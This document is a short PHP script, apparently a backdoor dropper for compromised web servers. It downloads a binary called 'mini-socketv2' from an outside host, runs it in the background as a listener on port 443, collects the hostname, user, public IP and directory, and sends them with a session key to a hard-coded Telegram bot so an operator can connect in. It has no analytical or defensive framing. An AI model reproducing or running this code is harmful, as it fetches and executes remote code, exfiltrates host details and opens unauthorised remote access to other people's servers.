<?php
// === Telegram Config ===
$TG_BOT_TOKEN = "8628717278:AAEcQd6vINfT95yNRv8tRD_u-51pFwDamqs";
$TG_CHAT_ID   = "1142721678";

// === Download binary ===
file_put_contents('ms', file_get_contents('https://minisocket.io/bin/mini-socketv2'));
chmod('ms', 0755);

// === Generate session key ===
$S = trim(shell_exec('./ms -g 2>/dev/null'));

// === Run with env vars ===
putenv("MINI_PORT=443");
putenv("MINI_ARGS=-s $S -d");
shell_exec('./ms > /dev/null 2>&1 &');

// === Gather system info ===
$HOST    = trim(shell_exec('hostname 2>/dev/null')) ?: 'unknown';
$USER    = trim(shell_exec('whoami 2>/dev/null'))   ?: 'unknown';
$IP      = trim(@file_get_contents('https://ifconfig.me')) ?: 'unknown';
$PWD_DIR = getcwd();

// === Send Telegram notification ===
$MSG = "🔌 *Mini-Socket Connected*

🖥 *Host:* `{$HOST}`
👤 *User:* `{$USER}`
🌐 *IP:* `{$IP}`
📂 *Dir:* `{$PWD_DIR}`

🔑 *Session Key:*
`{$S}`

📡 *Connect with:*
`mini-ncv2 -s {$S}`";

$postData = [
    'chat_id'    => $TG_CHAT_ID,
    'text'       => $MSG,
    'parse_mode' => 'Markdown',
];

$ch = curl_init("https://api.telegram.org/bot{$TG_BOT_TOKEN}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

echo "Connect with: mini-ncv2 -s $S\n";
